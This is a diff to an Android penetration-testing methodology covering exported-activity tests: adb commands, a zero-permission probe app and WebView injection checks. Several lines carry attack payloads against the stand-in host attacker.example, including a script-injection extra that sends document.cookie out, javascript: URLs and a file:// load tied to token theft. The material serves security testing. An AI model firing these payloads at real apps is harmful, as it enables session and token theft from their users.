@@ -104,6 +104,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 
 ## Items
 
+Every `How` below assumes the P2 layout (START.md §6): `$DEC` is `$E/decompiled`, jadx output lives under `$DEC/jadx/` (`$DEC/jadx/sources/`), apktool output under `$DEC/apktool/` (`$DEC/apktool/AndroidManifest.xml` is the merged, decoded manifest; split and feature manifests under `$DEC/apktool-<split>/`). Every value handed to `adb shell am …` is parsed **twice** — once by your shell, once by the device shell: wrap the whole remote command in single quotes and use double quotes inside (`adb shell 'am start -n pkg/.Act --es html "<script src=//attacker.example></script>"'`); from Python pass the remote command as ONE string (`subprocess.run(['adb','shell', remote_cmd])`, never `['adb','shell','sh','-c',x]`); never leave `;`, `|`, `&`, `<`, `>`, `$`, `?`, `*` or a space in an unquoted remote argument. Read the `am start -W` status, not `$?`: `delivered to currently running top-most instance` and `brought to the front` are not fresh starts (D04-004, D04-028), and `adb shell id` must print uid 2000 before any shell-side launch is cited as a contrast (D04-002).
+
 ### D04-001 · Build the exported-activity register from the installed package, not the source manifest
 
 | | |
@@ -112,6 +114,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what it exposes) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0160, MASTG-TOOL-0004, MASTG-TOOL-0015; `risks/android-exported` |
 
 - **Test:** Enumerate every `<activity>` and `<activity-alias>` with its `exported`, `permission`,
@@ -120,21 +123,26 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   and aliases, appear in `dumpsys` even when you missed them in the manifest.
 - **How:**
   ```bash
-  apktool d base.apk -o out/ >/dev/null
+  # pull EVERY split; feature modules carry their own <activity> elements, and P2 may have decoded base only
+  for p in $(adb shell pm path "$PKG" | sed 's/package://'); do adb pull "$p" "$E/apk/"; done
+  for a in "$E"/apk/*.apk; do n=$(basename "$a" .apk); [ "$n" = base ] || apktool d -f "$a" -o "$DEC/apktool-$n" >/dev/null; done
+  xmlstarlet sel -t -m "//activity | //activity-alias" -v "@android:name" -n "$DEC"/apktool*/AndroidManifest.xml | sort -u | wc -l   # must equal the dumpsys count below
+  grep -oE 'dist:module[^>]*' "$DEC/apktool/AndroidManifest.xml"   # on-demand dynamic features: absent until installed — trigger their install before the sweep
   xmlstarlet sel -t -m "//activity | //activity-alias" \
     -v "name()" -o " name=" -v "@android:name" \
     -o " exported=" -v "@android:exported" -o " perm=" -v "@android:permission" \
     -o " affinity=" -v "@android:taskAffinity" -o " launchMode=" -v "@android:launchMode" \
     -o " docLaunch=" -v "@android:documentLaunchMode" -o " imf=" -v "@android:intentMatchingFlags" \
-    -o " filters=" -v "count(intent-filter)" -n out/AndroidManifest.xml | tee exported_register.txt
+    -o " filters=" -v "count(intent-filter)" -n $DEC/apktool/AndroidManifest.xml | tee exported_register.txt
   # raw view — exported=true renders as 0xffffffff in the binary manifest
   aapt2 d xmltree base.apk --file AndroidManifest.xml | grep -A25 -E "E: activity|E: activity-alias"
   # the installed truth, including library-contributed components
   adb shell dumpsys package com.target.app | sed -n '/Activity Resolver Table/,/Receiver Resolver Table/p'
   ```
 - **Proof:** A register file with one row per activity and alias, in which every row has a non-empty
-  `exported` column resolved (see D04-002) and a `perm` column. The artefact is the attack-surface appendix
-  of the report.
+  `exported` column resolved (see D04-002) and a `perm` column, and whose decoded count equals the
+  `dumpsys package` Activity Resolver count — a shortfall is a split you did not decode. The artefact is
+  the attack-surface appendix of the report.
 - **Escalation:** The `perm=` empty rows are the input to D04-004 and every item after it. Rows whose name
   contains `debug|dev|internal|qa|staging|flag|config` go to D04-013 first. Rows with a `<data>` filter also
   belong to -> D09 deep links.
@@ -151,6 +159,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all; the implicit-export default is **LEGACY** and applies only at targetSdk < 31 |
+| **Requires** | — |
 | **Maps to** | `risks/android-exported`; `about/versions/12/behavior-changes-12#exported`; MobSF `exported_intent_filter_exists` / `explicitly_exported`; mindedsecurity `MSTG-PLATFORM-4_3` |
 
 - **Test:** For `<activity>`, `<activity-alias>`, `<service>` and `<receiver>` the default is `"false"` with
@@ -162,7 +171,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   aapt dump badging base.apk | grep -oE "(target|min)SdkVersion:'[0-9]+'"
   python3 - <<'PY'
   import re
-  x = open('out/AndroidManifest.xml').read()
+  x = open('$DEC/apktool/AndroidManifest.xml').read()
   pat = r'<(activity|activity-alias|service|receiver|provider)\b[^>]*>.*?</\1>|<(activity|activity-alias|service|receiver|provider)\b[^>]*/>'
   for m in re.finditer(pat, x, re.S):
       b = m.group(0); head = b.split('>')[0]
@@ -172,10 +181,14 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   ```
   Then prove it empirically rather than trusting the computation:
   ```bash
-  adb shell am start -n com.target.app/.TheActivity
+  adb shell id        # must print uid=2000(shell); after `adb root` or on a rooted AVD it is uid=0 and starts NON-exported components
+  adb unroot 2>/dev/null; adb shell id
+  adb shell am start -W -n com.target.app/.TheActivity
   ```
 - **Proof:** The absence of `java.lang.SecurityException: Permission Denial: ... not exported from uid ...`
-  on the launch is the proof of export. `am start` result codes: `3` = delivered; `-92 / Access blocked` =
+  on the launch is the proof of export **only when `adb shell id` shows uid 2000** — a uid-0 shell (rooted
+  AVD, `adb root`, userdebug) reaches non-exported components and proves nothing; the AM-03 proof is the
+  zero-permission probe (D04-005). `am start` result codes: `3` = delivered; `-92 / Access blocked` =
   rejected by `enforceIntentFilter`; `102` = `BAL_BLOCK`.
 - **Escalation:** Each implicitly-exported component is a component the developer did not intend to export —
   say so in the report, because "we never meant to export it" is the real root cause on sub-31 builds, and
@@ -203,10 +216,11 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **How:**
   ```bash
   xmlstarlet sel -t -m "//activity-alias" -v "@android:name" -o " -> " -v "@android:targetActivity" \
-    -o " exported=" -v "@android:exported" -o " perm=" -v "@android:permission" -n out/AndroidManifest.xml
-  xmllint --format out/AndroidManifest.xml | grep -n -A10 '<activity-alias'
+    -o " exported=" -v "@android:exported" -o " perm=" -v "@android:permission" -n $DEC/apktool/AndroidManifest.xml
+  xmllint --format $DEC/apktool/AndroidManifest.xml | grep -n -A10 '<activity-alias'
   # launch the ALIAS class name, never the target
   adb shell am start -n com.target.app/.PublicAlias
+  adb shell id                                                  # uid=2000 — a uid-0 shell starts RealActivity too and voids the contrast
   adb shell am start -n com.target.app/.internal.RealActivity   # expect Permission Denial
   ```
 - **Proof:** The target activity's UI appears after launching the *alias* class name, while a direct launch
@@ -241,11 +255,14 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   adb shell monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 >/dev/null; sleep 6
   adb logcat -c -b crash
   N=0
-  for A in $(adb shell dumpsys package "$PKG" | grep -oE "$PKG/[A-Za-z0-9_.\$/]*" | sort -u); do
+  # activities only — the bare package grep also sweeps services, receivers and providers
+  for A in $(adb shell dumpsys package "$PKG" | sed -n '/Activity Resolver Table/,/Receiver Resolver Table/p' | grep -oE "$PKG/[A-Za-z0-9_.\$]+" | sort -u); do
     for X in "" "--es model x" "--ei model 1" "--es url http://x/" "--esn nullextra"; do
-      adb shell am start -n "$A" $X >/dev/null 2>&1; sleep 2
+      # the whole remote command is ONE quoted string: the device shell parses it a second time
+      R=$(adb shell "am start -W -n '$A' $X" 2>&1); sleep 2
+      S=$(printf '%s' "$R" | grep -oE 'Status: [a-z]+|LaunchState: [A-Z_]+|delivered to currently running top-most instance|brought to the front|Permission Denial|Error: [^\n]*' | tr '\n' ' ')
       T=$(adb shell dumpsys activity activities | grep -m1 topResumedActivity | sed 's/.*u0 //;s/ .*//')
-      printf '%-70s %-18s -> %s\n' "$A" "${X:-<bare>}" "$T"; N=$((N+1))
+      printf '%-70s %-18s -> %-40s %s\n' "$A" "${X:-<bare>}" "$T" "$S"; N=$((N+1))
       adb shell input keyevent KEYCODE_BACK >/dev/null 2>&1; sleep 1
     done
   done
@@ -259,10 +276,13 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   ```
   Note drozer's own documented behaviour: *"If no flags are specified, drozer will add the ACTIVITY_NEW_TASK
   flag."* Pass `--flags 0x0` when you need a same-task launch.
-- **Proof:** The `topResumedActivity` column. A component that is still resumed under attacker-supplied
-  extras is a candidate; a component absent from the column finished itself. `rows=N` must equal
-  `activities × extra-sets` — a shell loop that silently produced fewer rows than that has failed, and the
-  "clean sweep" is an artefact of the loop, not of the app.
+- **Proof:** The `topResumedActivity` column read together with the status column. A component that is
+  still resumed under attacker-supplied extras is a candidate; a component absent from the column finished
+  itself. Rows whose status says `delivered to currently running top-most instance` (`singleTop`/`singleTask`
+  rows from the second extra set on) were `onNewIntent` deliveries, not fresh starts — route them to
+  D04-028 and do not count them as "stayed resumed"; `brought to the front` rows ran nothing and must be
+  re-run. `rows=N` must equal `activities × extra-sets` — a shell loop that silently produced fewer rows
+  than that has failed, and the "clean sweep" is an artefact of the loop, not of the app.
 - **Escalation:** Every resumed row goes to D04-007 (does it render data?), D04-010 (does it take an
   identity?) and -> D08 (does it forward `getIntent()`?).
 - **Ruled out when:** Every exported activity either finishes immediately or renders a screen that requires
@@ -283,7 +303,20 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **Test:** `adb shell am start` runs as `shell` (uid 2000), which holds `android.permission.*` grants no
   third-party app has, and on some builds can start components that are not exported at all. A finding whose
   only evidence is an adb command will be disputed, and correctly so.
-- **How:** A stub app with a completely empty `<uses-permission>` set:
+- **How:** Use the shared probe (`attacker-app/`, package `com.sanehunters.probe`: zero `<uses-permission>`,
+  `<queries>` for the victim) in its `start` step — explicit component, typed extras, optional result channel —
+  before writing any stub of your own:
+  ```bash
+  adb shell am start -S -a probe.fire.1 -n com.sanehunters.probe/.MainActivity --es run start \
+    --es victim com.target.app --es component .ui.AccountActivity \
+    --es extras "userId:i=1337;skipPin:z=true" --ez forresult true      # typed grammar name:type=value, ';'-separated
+  adb logcat -d -s PROBE:V                                              # PROBE|start|…  PROBE|result|resultCode/data/extras
+  adb pull /sdcard/Android/data/com.sanehunters.probe/files/ "$E/logs/probe/"   # the file mirror — read THIS, not only logcat
+  ```
+  `-S` (or a fresh `-a probe.fire.$N` per fire) is mandatory: a re-launched live probe is "delivered to
+  top" and runs nothing, and the sweep reads as empty. Some OEM builds drop third-party `Log.i` from logcat
+  entirely — the probe mirrors every line to its external-files directory for that reason.
+  Fallback stub for a shape the probe does not cover (same rules: no permissions, `<queries>`, a file mirror):
   ```java
   // MainActivity.onCreate of com.poc.zeroperm — manifest declares NO permissions
   Intent i = new Intent();
@@ -297,12 +330,14 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   ```bash
   adb install -r zeroperm.apk
   adb shell dumpsys package com.poc.zeroperm | sed -n '/requested permissions/,/install permissions/p'
-  adb shell am start -n com.poc.zeroperm/.MainActivity
-  adb logcat -s poc:I
+  adb shell am start -S -W -n com.poc.zeroperm/.MainActivity
+  adb logcat -d -s poc:I
   ```
 - **Proof:** The `dumpsys package` block showing an empty requested-permission list for the PoC, the PoC's
-  own logcat tag carrying the stolen data or the target activity resumed, and the PoC's `AndroidManifest.xml`
-  included in the evidence tree.
+  own log (the probe's `files/probe-<session>.log` pulled from the device, or the stub's logcat tag) carrying
+  the stolen data or the target activity resumed, and the PoC's `AndroidManifest.xml` included in the
+  evidence tree. A logcat with no probe lines at all is a dropped-log or collapsed-launch artefact, not a
+  negative — read the file mirror and check the `ready` line says `launch=onCreate`.
 - **Escalation:** This is the gate that turns every candidate in this chapter into an AM-03 finding rather
   than an AM-12 observation. Keep the rooted device for discovery only.
 - **Ruled out when:** The activity starts from `adb shell` but a zero-permission PoC receives
@@ -327,26 +362,33 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   bypasses its filters" gap. Two findings live here: the attribute absent altogether on a component that
   trusts intent data, and — the stronger one — an app that sets `enforceIntentFilter` globally and then sets
   `intentMatchingFlags="none"` on one exported component.
-- **How:**
+- **How:** D03-044 owns the attribute audit and the probe-app positive control (match / mismatch / null
+  action, per component type) — do not repeat it. Here, take the activities D03-044 left unhardened (no
+  `enforceIntentFilter`, or a `none` hole) that carry a `<data>` filter and read `getData()`/extras, and
+  deliver the arbitrary URI from the zero-permission probe — shell senders are **not** subject to the check
+  and are not a valid control in either direction (an engagement saw mismatched explicit intents from
+  `adb shell` delivered on an API 36 device):
   ```bash
-  grep -nE 'android:intentMatchingFlags' out/AndroidManifest.xml
-  # on-device: send a deliberately mismatched EXPLICIT VIEW intent
-  adb shell am start -n com.target.app/.MainActivity -a android.intent.action.VIEW -d 'https://evil.example/'
-  adb logcat | grep -E "Intent does not match component's intent filter:|Access blocked:"
+  awk -F, 'NR>1 && $2 ~ /activity/ && $4 ~ /true|implicit|VERIFY/' "$E/inventory/components.csv"   # the rows; join with inventory/deeplinks.csv for the <data> filters
+  adb shell am start -S -a probe.fire.1 -n com.sanehunters.probe/.MainActivity --es run start \
+    --es victim com.target.app --es component .MainActivity --es action android.intent.action.VIEW --es data "https://evil.example/" --ez browsable false
+  adb logcat -d | grep -E "Intent does not match component's intent filter:|Access blocked:"
   ```
-  The documented logcat filter is `tag=:PackageManager & (message:"Intent does not match component's intent
-  filter:" | message: "Access blocked:")`.
-- **Proof:** `result code=-92 / Access blocked` when the flag is in force, versus `result code=3 / delivered`
-  when it is not — and, for the hole variant, a component carrying `intentMatchingFlags="none"` that produces
-  no `Access blocked:` line while its siblings do.
+  Record which component types and sender classes you observed the enforcement on — it is verified for
+  third-party-app senders to activities; do not generalise from an `adb shell` send.
+- **Proof:** The probe's transcript showing the mismatched explicit `VIEW` delivered (`PROBE|start|…`, the
+  activity resumed with the attacker URI, no `Access blocked:` line) against the D03-044 control that shows
+  the block on a hardened sibling — and, for the hole variant, a component carrying
+  `intentMatchingFlags="none"` that produces no `Access blocked:` line while its siblings do.
 - **Escalation:** Absence is what lets a **local** app deliver an arbitrary URI (any host, `javascript:`,
   `data:`) to an exported Flutter/React Native `MainActivity` router that a browser could only reach through
   the `autoVerify`'d hosts -> D09 -> D10. Absence plus an activity that forwards `getIntent()` data is
   -> D08.
 - **Ruled out when:** `<application android:intentMatchingFlags="enforceIntentFilter">` is set with no
-  component-level `none` override, **and** the mismatched explicit intent above returns `-92 / Access
-  blocked`. On a target below API 36 this control cannot exist, so the correct negative is "not applicable at
-  targetSdk N", not "hardened".
+  component-level `none` override, **and** the mismatched explicit intent sent **from the zero-permission
+  probe** produces the `Access blocked:` line and the activity does not resume (as D03-044). On a target
+  below API 36 this control cannot exist, so the correct negative is "not applicable at targetSdk N", not
+  "hardened".
 
 ### D04-007 · Post-authentication activity renders account data with no session check
 
@@ -375,12 +417,16 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   ```
   Read the gate in jadx before you rate it:
   ```bash
-  grep -rnE 'class .*(Base|Secure|Locked)Activity|onCreate\(.*\{' out/sources/ | head
-  grep -rnE 'isLoggedIn|hasSession|requireAuth|getAccessToken\(\)\s*==\s*null|startLoginActivity' out/sources/
+  grep -rnE 'class .*(Base|Secure|Locked)Activity|onCreate\(.*\{' $DEC/jadx/sources/ | head
+  grep -rnE 'isLoggedIn|hasSession|requireAuth|getAccessToken\(\)\s*==\s*null|startLoginActivity' $DEC/jadx/sources/
   ```
 - **Proof:** A screenshot of the victim's real data on a device where the login flow was never completed in
   this process lifetime, **plus** the network request that screen issued returning `200` with real data in
   the proxy log. The screen rendering from cache is a different, lesser finding — say which one you have.
+  The screenshot is the operator's evidence, not the attacker's: for AM-03 the P1 needs a read path out of
+  the screen — `setResult` (D04-022), a bridge (D04-016), a file/provider write (D04-069, D04-023), or a
+  co-resident capture consumer on a screen that lacks `FLAG_SECURE` (D04-042). Without one, the finding is
+  AM-11 (unlocked device in hand) at Low.
 - **Escalation:** This is the canonical proof that authorisation is client-side. Immediately re-test the same
   operation directly against the API -> D15; the same flaw is usually there and is worth more. If the screen
   takes an identifier, go to D04-010.
@@ -388,7 +434,9 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   `finish()` plus a redirect to the login activity before any data load, **and** the launch from a logged-out
   state lands on the login screen with `topResumedActivity` naming the login component. A blank or skeleton
   screen with no data is also a true negative for this item — record it as "local gate bypassed, no data
-  rendered" rather than dropping it.
+  rendered" rather than dropping it. Also record as **parked, not ruled out**: the activity renders the
+  owner's data but the caller has no read path — write the row as `parked: screen-only exposure, consumer
+  for any pixel-read/screen-capture primitive (D04-022/-042/-050)` so P7 picks it up if a primitive appears.
 
 ### D04-008 · In-app lock / PIN / biometric gate bypassed by starting an inner activity
 
@@ -406,7 +454,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   pinned shortcut, a widget tap — skips it.
 - **How:**
   ```bash
-  grep -rniE 'AppLockActivity|PinActivity|LockScreenActivity|BiometricPrompt|isAppLocked|requireUnlock|showPinScreen' out/sources/
+  grep -rniE 'AppLockActivity|PinActivity|LockScreenActivity|BiometricPrompt|isAppLocked|requireUnlock|showPinScreen' $DEC/jadx/sources/
   adb shell dumpsys package com.target.app | grep -oE "com\.target\.app/[A-Za-z0-9_.\$]+" | sort -u > acts.txt
   # arm the lock (background the app past its timeout), then walk every activity
   while read A; do
@@ -436,6 +484,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **VRT** | governs `broken_authentication_and_session_management.authentication_bypass` (P1) claims |
 | **Attacker** | n/a — kill gate |
 | **Applies to** | every auth-bypass claim originating in this chapter |
+| **Requires** | — |
 | **Maps to** | claude-bughunter `triage-validation` "THE LAYER-ORDERING TRAP"; MASWE-0018 |
 
 - **Test:** An exported activity that renders is evidence that the *client* gate was skipped, nothing more.
@@ -482,7 +531,10 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   server acting on it is.
 - **How:**
   ```bash
-  grep -rnE 'getIntent\(\)\.(getStringExtra|getIntExtra|getLongExtra|getBooleanExtra|getExtras|getData|getParcelableExtra)' out/sources/
+  grep -rnE 'getIntent\(\)\.(getStringExtra|getIntExtra|getLongExtra|getBooleanExtra|getExtras|getData|getParcelableExtra)' $DEC/jadx/sources/
+  # untyped reads — the form obfuscated and Kotlin-compiled builds actually use; the typed grep above misses them
+  grep -rnE 'getExtras\(\)\.get\(|extras\.get\(|\.get\("[A-Za-z0-9_.:]+"\)' $DEC/jadx/sources/ | grep -vE 'Map|JSON|SharedPreferences'
+  grep -rnE '\((String|Uri|Intent|PendingIntent|Bundle|Class|Serializable|Parcelable)\) *[A-Za-z0-9_.]*(extras|getExtras\(\)|bundle)\.get\(' $DEC/jadx/sources/
   ```
   Then drive every typed branch. `--es` string, `--ez` boolean, `--ei` int, `--el` long, `--ef` float,
   `--esa` string array, `--esn` null string, `--eu` URI:
@@ -532,7 +584,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   recover.
 - **How:**
   ```bash
-  grep -rnE 'getSharedPreferences\(|\.edit\(\)|putString\(|putBoolean\(' out/sources/ -B12 \
+  grep -rnE 'getSharedPreferences\(|\.edit\(\)|putString\(|putBoolean\(' $DEC/jadx/sources/ -B12 \
     | grep -nE 'getIntent\(\)|getQueryParameter|getData\(\)'
   adb shell am start -a android.intent.action.VIEW \
     -d 'target://app?status=%7B%22user%22%3A%22HACKER_MAN%22%2C%22ws%22%3A%22evil.via.targetnetworks%22%7D'
@@ -564,20 +616,34 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   unauthenticated local caller. The integrity break is the finding, not the confidentiality one.
 - **How:**
   ```bash
-  adb shell am start -n com.medium.reader/com.medium.android.donkey.save.SaveToMediumActivity \
-    -e android.intent.extra.TEXT "https://attacker.example/"
-  adb shell am start -n com.target.app/com.target.app.ShareLinkActivity \
-    -a android.intent.action.PROCESS_TEXT \
-    --es android.intent.extra.PROCESS_TEXT "x4hd2k9pq-marker"
+  adb shell 'am start -n com.target.app/.SaveToListActivity -e android.intent.extra.TEXT "https://attacker.example/"'
+  adb shell 'am start -n com.target.app/.ShareLinkActivity -a android.intent.action.PROCESS_TEXT --es android.intent.extra.PROCESS_TEXT "x4hd2k9pq-marker"'
+  ```
+  Bracket the sweep so the negative has an artefact — every non-GET the app issued inside the window:
+  ```bash
+  date -u +%s > sweep.start; <run the share-target launches>; date -u +%s > sweep.end
+  cat > window.py <<'PY'
+  s = int(open('sweep.start').read()); e = int(open('sweep.end').read())
+  def response(f):
+      if f.request.method != 'GET' and s <= int(f.request.timestamp_start) <= e:
+          print(int(f.request.timestamp_start), f.request.method, f.request.pretty_url)
+  PY
+  mitmdump -nr "$E/evidence/flows.mitm" -q -s window.py | tee logs/D04-012-window.txt
   ```
 - **Proof:** The attacker-supplied item appearing in the victim's server-side list, **visible on the web
-  app** — the out-of-band confirmation is what stops this being dismissed as local UI state.
+  app** — the out-of-band confirmation is what stops this being dismissed as local UI state. For the
+  negative: `logs/D04-012-window.txt`, the bracketed flow extract, listing zero `POST`/`PUT`/`PATCH`/GraphQL
+  mutations between launch and finish.
 - **Escalation:** Combine with a stored-content sink in the web application for cross-surface impact; and
   check whether the same activity accepts an identity extra (D04-010), which moves it from integrity-only to
   P1.
 - **Ruled out when:** The share target requires a user tap on a confirmation control that the caller cannot
   supply, **and** that control is not tapjackable (D04-047/-048), **and** no extra shortcuts it. Verified by
-  launching with every extra the handler reads and observing no server request until a real touch.
+  launching with every extra the handler reads and the bracketed flow extract above listing zero
+  `POST`/`PUT`/`PATCH`/GraphQL-mutation requests between launch and finish, attached as
+  `logs/D04-012-window.txt`. Mechanism reading alone (a navigation table with no write) is
+  `ruled-out (static)` and must say so — a proxy capture that was never correlated against the sweep window
+  is "no write observed", not "no request issued".
 
 ### D04-013 · Debug, developer or internal tooling activity left exported in a release build
 
@@ -595,7 +661,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   app sends credentials — or only display configuration.
 - **How:**
   ```bash
-  grep -nE 'android:exported="true"' out/AndroidManifest.xml -B6 \
+  grep -nE 'android:exported="true"' $DEC/apktool/AndroidManifest.xml -B6 \
     | grep -iE 'dev|debug|inspector|test|playground|qa|staging|flag|config|internal'
   adb shell dumpsys package com.target.app | grep -iE 'devsupport|DevSettings|Inspector'
   adb shell am start -n com.target.app/com.facebook.react.devsupport.DevSettingsActivity
@@ -629,9 +695,10 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   "router" activity that does `Fragment.instantiate(...)` or `Class.forName(...)` on an intent-derived name.
 - **How:**
   ```bash
-  grep -rn 'extends PreferenceActivity' out/sources/
-  grep -rn 'isValidFragment' out/sources/          # absent, or "return true", is the finding
-  grep -rnE 'Fragment\.instantiate|:android:show_fragment|EXTRA_SHOW_FRAGMENT|Class\.forName\(' out/sources/
+  grep -rn 'extends PreferenceActivity' $DEC/jadx/sources/
+  grep -rn 'isValidFragment' $DEC/jadx/sources/          # absent, or "return true", is the finding
+  grep -rnE 'Fragment\.instantiate|:android:show_fragment|EXTRA_SHOW_FRAGMENT|Class\.forName\(|\.get\("[^"]*(fragment|class|clazz|clz)[^"]*"\)' $DEC/jadx/sources/
+  grep -rnE 'getExtras\(\)\.get\(|extras\.get\(' $DEC/jadx/sources/ | grep -iE 'fragment|class|clazz|clz|name'   # the untyped read obfuscated builds use
   adb shell am start -n com.target.app/.SettingsActivity \
     --es ':android:show_fragment' 'com.target.app.internal.DeveloperFragment'
   adb shell dumpsys activity top | grep -i fragment
@@ -662,21 +729,18 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **How:**
   ```bash
   # locate the sink, then walk backwards to the extra
-  grep -rn 'loadUrl(\|loadData(\|loadDataWithBaseURL(' out/sources/ -B15 \
+  grep -rn 'loadUrl(\|loadData(\|loadDataWithBaseURL(' $DEC/jadx/sources/ -B15 \
     | grep -nE 'getStringExtra|getIntent|getQueryParameter'
   ```
   Parameter names worth brute-forcing when the build is obfuscated:
   `url, path, link, redirect, page-url, redirect-url, navigate, partner_url, checkoutUrl, orig_uri, auth_url, extra_url, URL`.
   ```bash
-  adb shell am start -n com.irccloud.android/com.irccloud.android.activity.SAMLAuthActivity \
-    -e title "IRCCloud: Login Required" -e auth_url "http://attacker.example/"
-  adb shell am start -n com.target.app/.CheckoutActivity \
-    -es "checkoutUrl" "https://attacker.example/x.html"
+  # every value is parsed again by the device shell: ONE single-quoted remote command, double quotes inside
+  adb shell 'am start -n com.target.app/.SsoWebViewActivity -e title "Login Required" -e auth_url "http://attacker.example/"'   # the #283058 SAML-activity/auth_url shape
+  adb shell 'am start -n com.target.app/.CheckoutActivity --es checkoutUrl "https://attacker.example/x.html"'
   # the file:// variant — this is the one that produced the token theft
-  adb shell am start -n com.target.app/.CheckoutActivity \
-    -es "checkoutUrl" "file:///data/data/com.target.app/files/PersistedInstallation.json"
-  adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity \
-    -d "javascript://example.com%0A alert(1);"
+  adb shell 'am start -n com.target.app/.CheckoutActivity --es checkoutUrl "file:///data/data/com.target.app/files/PersistedInstallation.json"'
+  adb shell 'am start -n com.target.app/.WebViewActivity -d "javascript://example.com%0A alert(1);"'   # the #499348 shape; unquoted, the space and ';' are eaten by the device shell
   ```
   From a remote page (works in WebViews and Firefox; Chrome blocks the selector form):
   ```html
@@ -694,29 +758,37 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   **and** `file://`, `javascript:`, `data:` and `content://` are rejected — verified by sending each scheme
   and observing the load refused. An app that simply has no WebView is also a clean negative; say so.
 
-### D04-016 · Exported activity loads an attacker-supplied HTML **body** into a WebView
+### D04-016 · Exported activity loads an attacker-supplied or attacker-**influenced** HTML body into a WebView
 
 | | |
 |---|---|
 | **Severity ceiling** | High |
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
-| **Applies to** | apps whose WebView host activity accepts both a `url` and an `html` extra |
+| **Applies to** | any activity whose intent-derived string reaches `loadData`/`loadDataWithBaseURL` — as the whole body (an `html` extra next to a `url` extra), or interpolated into an HTML template on a trusted base |
 | **Requires** | exported-activity, webview |
 | **Maps to** | H1 #189793 (Quora, Low as filed, with the escalation ladder documented in the report) |
 
 - **Test:** Worse than a URL extra, because the host check is skipped entirely — your markup executes on the
-  origin the app chose.
+  origin the app chose. Two shapes: the whole body arrives in an extra and is loaded verbatim; or an ordinary
+  string extra (an id, a title, a video key) is concatenated into an HTML template that is then loaded with
+  `loadDataWithBaseURL` on a trusted base — the shape found in practice, and a distinct primitive: the
+  marker only has to close the attribute or tag the template opens.
 - **How:**
   ```bash
-  grep -rn 'loadDataWithBaseURL(\|loadData(' out/sources/ -B12 | grep -nE 'getStringExtra|getIntent'
-  adb shell am start -n com.quora.android/com.quora.android.ActionBarContentActivity \
-    -e url 'http://test/test' -e html '<script src=//attacker.example></script>'
-  adb shell am start -n com.quora.android/com.quora.android.ModalContentActivity \
-    -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
+  grep -rn 'loadDataWithBaseURL(\|loadData(' $DEC/jadx/sources/ -B12 | grep -nE 'getStringExtra|getIntent'
+  # interpolation shape: every loadDataWithBaseURL, then walk its data argument back to a builder fed by an extra
+  grep -rn 'loadDataWithBaseURL(' $DEC/jadx/sources/ | cut -d: -f1 | sort -u | while read -r f; do grep -nE 'String\.format\(|StringBuilder|\+ *"<|replace\("\{|getStringExtra|getQueryParameter' "$f"; done
+  # whole-body shape — the remote command is ONE single-quoted string, double quotes inside (the device shell parses it again)
+  adb shell 'am start -n com.target.app/.ContentActivity -e url "http://test/test" -e html "<script src=//attacker.example></script>"'
+  adb shell 'am start -n com.target.app/.ContentActivity -e url "http://test/test" -e html "<script>alert(Bridge.getClipboardData());</script>"'
+  # interpolation shape — a marker that closes the attribute/tag the template opens
+  adb shell 'am start -n com.target.app/.PlayerActivity --es video_id "x4hd2k9pq\"></iframe><img src=x onerror=fetch(\"https://attacker.example/\"+document.cookie)>"'
   ```
-- **Proof:** Your remote script executing **and** a bridge method returning data — #189793 demonstrated
-  `QuoraAndroid.getClipboardData()` returning clipboard contents, which is what made it more than a self-XSS.
+- **Proof:** Your remote script executing **and** a bridge method returning data — the disclosed case (#189793)
+  demonstrated a bridge's `getClipboardData()` returning clipboard contents, which is what made it more than a
+  self-XSS. For the interpolation shape: the marker arriving at your server with the trusted base origin in
+  `Referer`/`Origin`, or a bridge call succeeding — that is origin-bound XSS, rate it as D10.
 - **Escalation:** -> D10. The `addJavascriptInterface` reflection-to-RCE variant is **LEGACY** and requires
   minSdk < 17 (pre-`@JavascriptInterface` enforcement); at minSdk >= 17 the impact is confined to the
   annotated bridge methods, which is normally still enough.
@@ -740,7 +812,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   normal button.
 - **How:**
   ```bash
-  grep -rn 'ACTION_VIEW' out/sources/ -B10 | grep -nE 'getStringExtra|Uri\.parse'
+  grep -rn 'ACTION_VIEW' $DEC/jadx/sources/ -B10 | grep -nE 'getStringExtra|Uri\.parse'
   adb shell am start -n com.target.library.activities.LoginSelectorActivity \
     --es orig_uri "https://attacker.example/fake-sso"
   ```
@@ -765,35 +837,11 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **Requires** | exported-activity, flutter |
